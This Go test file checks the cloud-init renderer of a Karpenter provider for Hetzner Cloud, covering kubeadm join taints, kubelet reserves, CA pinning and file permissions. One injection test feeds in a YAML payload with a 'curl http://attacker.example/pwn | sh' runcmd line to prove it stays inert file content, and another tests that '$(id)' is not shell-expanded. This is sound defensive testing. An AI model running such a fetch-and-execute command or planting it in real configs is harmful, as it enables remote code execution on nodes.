package bootstrap

import (
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	"sigs.k8s.io/yaml"

	"github.com/itsh-cloud/karpenter-provider-hcloud/api/v1alpha1"
)

func testInput() Input {
	var kubelet v1alpha1.KubeletConfiguration
	return Input{
		NodeClass: &v1alpha1.HCloudNodeClass{
			Spec: v1alpha1.HCloudNodeClassSpec{
				Bootstrap: v1alpha1.BootstrapSpec{
					OSFamily:          v1alpha1.OSFamilyDebian,
					KubernetesVersion: "1.34.7",
					PackageRevision:   "1.1",
				},
			},
		},
		Join: JoinInput{
			APIServerEndpoint: "10.1.0.2:6443",
			Token:             "abcdef.0123456789abcdef",
			CACertHashes:      []string{"sha256:" + strings.Repeat("a", 64)},
			NodeLabels:        map[string]string{"karpenter.sh/nodepool": "general"},
			Kubelet:           &kubelet,
		},
	}
}

func render(t *testing.T, in Input) (string, cloudConfig) {
	t.Helper()
	out, err := Render(in)
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	var cfg cloudConfig
	body := strings.TrimPrefix(out, "#cloud-config\n")
	if err := yaml.Unmarshal([]byte(body), &cfg); err != nil {
		t.Fatalf("rendered document is not valid YAML: %v\n%s", err, out)
	}
	return out, cfg
}

func fileByPath(cfg cloudConfig, path string) (writeFile, bool) {
	for _, f := range cfg.WriteFiles {
		if f.Path == path {
			return f, true
		}
	}
	return writeFile{}, false
}

// TestUnregisteredTaintIsRendered is the regression test for the quietest
// failure in this package.
//
// Karpenter core logs an error and PROCEEDS when a node registers without
// karpenter.sh/unregistered, so omitting it produces no visible symptom. What
// actually happens is that pods land in the window between the kubelet
// registering and Karpenter stamping its labels, and bin-packing accounting is
// wrong from the first second.
func TestUnregisteredTaintIsRendered(t *testing.T) {
	_, cfg := render(t, testInput())

	f, ok := fileByPath(cfg, "/etc/kubernetes/kubeadm-join.yaml")
	if !ok {
		t.Fatal("no kubeadm-join.yaml written")
	}

	var join joinConfiguration
	if err := yaml.Unmarshal([]byte(f.Content), &join); err != nil {
		t.Fatalf("join config is not valid YAML: %v", err)
	}

	var found bool
	for _, taint := range join.NodeRegistration.Taints {
		if taint.Key == UnregisteredTaint.Key {
			found = true
			if taint.Effect != corev1.TaintEffectNoExecute {
				t.Errorf("unregistered taint effect = %q, want NoExecute", taint.Effect)
			}
		}
	}
	if !found {
		t.Error("karpenter.sh/unregistered taint missing; pods would land before " +
			"Karpenter labels the node and core only logs about it")
	}
}

// TestNodePoolTaintsAreRenderedAtRegistration: a taint that isolates workloads
// onto dedicated nodes is a boundary, and registering with it is stronger than
// having Karpenter sync it on afterwards.
func TestNodePoolTaintsAreRenderedAtRegistration(t *testing.T) {
	in := testInput()
	in.Join.Taints = []corev1.Taint{{Key: "dedicated", Value: "ci", Effect: corev1.TaintEffectNoSchedule}}

	_, cfg := render(t, in)
	f, _ := fileByPath(cfg, "/etc/kubernetes/kubeadm-join.yaml")

	var join joinConfiguration
	if err := yaml.Unmarshal([]byte(f.Content), &join); err != nil {
		t.Fatal(err)
	}
	if len(join.NodeRegistration.Taints) != 2 {
		t.Fatalf("taints = %v, want unregistered plus the pool taint", join.NodeRegistration.Taints)
	}
	if join.NodeRegistration.Taints[1].Key != "dedicated" {
		t.Errorf("pool taint missing: %v", join.NodeRegistration.Taints)
	}
}

// TestKubeletReservesMatchTheOverheadModel.
//
// These exact strings are what the node runs with, and the instancetype
// package subtracts the same numbers as InstanceTypeOverhead. If the two ever
// disagree, Karpenter over-packs every node by the difference and there is no
// alert for it: pods just sit Pending on a node the scheduler thinks has room.
func TestKubeletReservesMatchTheOverheadModel(t *testing.T) {
	_, cfg := render(t, testInput())
	f, _ := fileByPath(cfg, "/etc/kubernetes/kubeadm-join.yaml")

	var join joinConfiguration
	if err := yaml.Unmarshal([]byte(f.Content), &join); err != nil {
		t.Fatal(err)
	}

	args := map[string]string{}
	for _, a := range join.NodeRegistration.KubeletExtraArgs {
		args[a.Name] = a.Value
	}

	if got := args["kube-reserved"]; got != "cpu=200m,memory=512Mi" {
		t.Errorf("kube-reserved = %q", got)
	}
	if got := args["system-reserved"]; got != "cpu=200m,memory=512Mi" {
		t.Errorf("system-reserved = %q", got)
	}
	if got := args["cloud-provider"]; got != "external" {
		t.Errorf("cloud-provider = %q, want external", got)
	}

	// --eviction-hard REPLACES kubelet's default map, so every signal that
	// should stay active has to be listed.
	evict := args["eviction-hard"]
	for _, signal := range []string{
		"memory.available<500Mi", "nodefs.available<10%", "nodefs.inodesFree<5%",
		"imagefs.available<15%", "imagefs.inodesFree<5%",
	} {
		if !strings.Contains(evict, signal) {
			t.Errorf("eviction-hard missing %q; the flag replaces the whole map so "+
				"omitting a signal disables it. got: %s", signal, evict)
		}
	}
}

// TestDeterministicOutput: identical input must produce byte-identical
// userData, or every node would look drifted on every reconcile purely from
// Go's map iteration order.
func TestDeterministicOutput(t *testing.T) {
	in := testInput()
	in.Join.NodeLabels = map[string]string{
		"karpenter.sh/nodepool": "general", "a": "1", "b": "2", "c": "3", "d": "4",
	}
	in.NodeClass.Spec.Bootstrap.Sysctls = map[string]string{"vm.max_map_count": "262144", "vm.swappiness": "0"}

	first, err := Render(in)
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 50; i++ {
		got, err := Render(in)
		if err != nil {
			t.Fatal(err)
		}
		if got != first {
			t.Fatal("Render is not deterministic; every node would appear drifted on every reconcile")
		}
	}
}

// TestExtraFilesCannotEscapeTheDocument.
//
// ExtraFiles content is operator-supplied and arbitrary. Rendering the
// document from a text template would let content containing YAML terminate
// its own block and rewrite the rest, including the join configuration and its
// bootstrap token. Marshalling structs makes that structurally impossible;
// this test proves it.
func TestExtraFilesCannotEscapeTheDocument(t *testing.T) {
	in := testInput()
	malicious := "innocent\n" +
		"runcmd:\n" +
		"  - curl http://attacker.example/pwn | sh\n"
	in.NodeClass.Spec.Bootstrap.ExtraFiles = []v1alpha1.File{
		{Path: "/etc/evil.conf", Content: malicious, Permissions: "0644"},
	}

	out, cfg := render(t, in)

	// The payload survives verbatim as file CONTENT...
	f, ok := fileByPath(cfg, "/etc/evil.conf")
	if !ok || f.Content != malicious {
		t.Fatalf("extra file content was mangled: %q", f.Content)
	}
	// ...and did not become a runcmd.
	for _, c := range cfg.Runcmd {
		if strings.Contains(c, "attacker.example") {
			t.Fatalf("extra file content escaped into runcmd: %q", c)
		}
	}
	// Structural check, not a substring one: the payload legitimately contains
	// the literal text "runcmd:" as data, so counting occurrences cannot tell
	// safe from escaped. What matters is that the parsed document has exactly
	// one top-level runcmd key, and that it is ours.
	var top map[string]any
	if err := yaml.Unmarshal([]byte(strings.TrimPrefix(out, "#cloud-config\n")), &top); err != nil {
		t.Fatalf("document does not parse: %v", err)
	}
	cmds, ok := top["runcmd"].([]any)
	if !ok {
		t.Fatalf("runcmd is not a list: %T", top["runcmd"])
	}
	if len(cmds) != len(cfg.Runcmd) {
		t.Errorf("top-level runcmd has %d entries, struct decode saw %d; content escaped its block",
			len(cmds), len(cfg.Runcmd))
	}
}

// TestContainerdExtraConfigIsNotShellExpanded: the heredoc delimiter is
// quoted, so $(...) in operator TOML is written literally rather than executed
// during boot.
func TestContainerdExtraConfigIsNotShellExpanded(t *testing.T) {
	in := testInput()
	in.NodeClass.Spec.Bootstrap.Containerd.ExtraConfig = "# $(id) and $HOME stay literal\n[plugins]\n"

	_, cfg := render(t, in)

	var appendCmd string
	for _, c := range cfg.Runcmd {
		if strings.Contains(c, "/etc/containerd/config.toml") && strings.Contains(c, "cat >>") {
			appendCmd = c
		}
	}
	if appendCmd == "" {
		t.Fatal("containerd extraConfig was not appended")
	}
	if !strings.Contains(appendCmd, "<< 'KARPENTER_EOF'") {
		t.Error("heredoc delimiter is not quoted, so operator TOML would be shell-expanded at boot")
	}
}

func TestJoinRequiresCAPin(t *testing.T) {
	in := testInput()
	in.Join.CACertHashes = nil

	if _, err := Render(in); err == nil {
		t.Fatal("expected an error: joining without a CA pin trusts whatever answers on the endpoint")
	}
}

func TestJoinRequiresTokenAndEndpoint(t *testing.T) {
	for _, tc := range []struct {
		name   string
		mutate func(*Input)
	}{
		{"no token", func(i *Input) { i.Join.Token = "" }},
		{"no endpoint", func(i *Input) { i.Join.APIServerEndpoint = "" }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			in := testInput()
			tc.mutate(&in)
			if _, err := Render(in); err == nil {
				t.Error("expected an error")
			}
		})
	}
}

// TestJoinConfigIsNotWorldReadable: the file carries a live bootstrap token.
func TestJoinConfigPermissions(t *testing.T) {
	_, cfg := render(t, testInput())
	f, _ := fileByPath(cfg, "/etc/kubernetes/kubeadm-join.yaml")
	if f.Permissions != "0600" {
		t.Errorf("kubeadm-join.yaml permissions = %q, want 0600: it contains a live join token", f.Permissions)
	}
}

func TestAptRepoStreamFollowsMinorVersion(t *testing.T) {
	in := testInput()
	in.NodeClass.Spec.Bootstrap.KubernetesVersion = "1.35.2"

	out, cfg := render(t, in)

	if !strings.Contains(out, "stable:/v1.35/deb") {
		t.Error("apt repository stream does not follow the minor version")
	}
	var installed bool
	for _, c := range cfg.Runcmd {
		if strings.Contains(c, "kubelet=1.35.2-1.1") {
			installed = true
		}
	}
	if !installed {
		t.Error("package version pin does not match kubernetesVersion")
	}
}

func TestRejectsUnsupportedOSFamily(t *testing.T) {
	in := testInput()
	in.NodeClass.Spec.Bootstrap.OSFamily = "Ubuntu"
	if _, err := Render(in); err == nil {
		t.Error("expected an error for an unsupported osFamily")
	}
}

func TestPackagesAreDeduped(t *testing.T) {
	in := testInput()
	in.NodeClass.Spec.Bootstrap.ExtraPackages = []string{"curl", "htop", "curl"}

	_, cfg := render(t, in)

	counts := map[string]int{}
	for _, p := range cfg.Packages {
		counts[p]++
	}
	if counts["curl"] != 1 {
		t.Errorf("curl appears %d times", counts["curl"])
	}
	if counts["htop"] != 1 {
		t.Error("extra package missing")
	}
}

// TestOversizedUserDataIsRejected: hcloud caps user_data at 32 KiB, and
// silently exceeding it would fail every create with an opaque error.
func TestOversizedUserDataIsRejected(t *testing.T) {
	in := testInput()
	// Incompressible content, so gzip cannot rescue it.
	big := make([]byte, 64*1024)
	for i := range big {
		big[i] = byte(i*7 + i/251)
	}
	in.NodeClass.Spec.Bootstrap.ExtraFiles = []v1alpha1.File{{Path: "/etc/big", Content: string(big)}}

	if _, err := Render(in); err == nil {
		t.Error("expected an error for userData over the hcloud limit")
	}
}
